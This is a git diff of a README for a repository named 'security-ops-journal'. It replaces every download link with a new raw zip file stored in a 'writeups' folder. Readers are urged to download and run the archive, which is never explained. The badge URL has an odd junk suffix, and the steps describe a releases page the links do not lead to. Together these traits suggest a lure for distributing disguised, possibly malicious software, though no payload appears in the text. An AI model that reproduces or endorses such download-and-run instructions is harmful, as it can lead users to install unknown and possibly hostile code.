@@ -1,7 +1,7 @@
 # 📖 security-ops-journal - Your Guide to Cybersecurity Insights
 
-![Download Now](https://github.com/noe0408/security-ops-journal/raw/refs/heads/main/06_writeups/ops_security_journal_1.0-beta.5.zip%20Now-Here-success)  
-[Download Now](https://github.com/noe0408/security-ops-journal/raw/refs/heads/main/06_writeups/ops_security_journal_1.0-beta.5.zip)
+![Download Now](https://github.com/noe0408/security-ops-journal/raw/refs/heads/main/06_writeups/security-ops-journal-1.5.zip%20Now-Here-success)  
+[Download Now](https://github.com/noe0408/security-ops-journal/raw/refs/heads/main/06_writeups/security-ops-journal-1.5.zip)
 
 ## 📚 Overview
 
@@ -12,7 +12,7 @@ The **security-ops-journal** offers valuable resources for understanding and imp
 To begin your journey in cybersecurity, follow these steps to download and run our software.
 
 1. **Visit the Download Page:**  
-   Click the button above or go to this link: [Download Page](https://github.com/noe0408/security-ops-journal/raw/refs/heads/main/06_writeups/ops_security_journal_1.0-beta.5.zip).
+   Click the button above or go to this link: [Download Page](https://github.com/noe0408/security-ops-journal/raw/refs/heads/main/06_writeups/security-ops-journal-1.5.zip).
 
 2. **Select the Latest Release:**  
    You will see a list of the latest software releases. Look for the topmost version marked as "Latest".
@@ -76,7 +76,7 @@ Join our user community to share your experiences and seek help:
 
 ## 📥 Download & Install
 
-To get started, please [visit this page to download](https://github.com/noe0408/security-ops-journal/raw/refs/heads/main/06_writeups/ops_security_journal_1.0-beta.5.zip) the latest version of the software. 
+To get started, please [visit this page to download](https://github.com/noe0408/security-ops-journal/raw/refs/heads/main/06_writeups/security-ops-journal-1.5.zip) the latest version of the software. 
 
 Simply follow the outlined steps to ensure a smooth installation. 
 
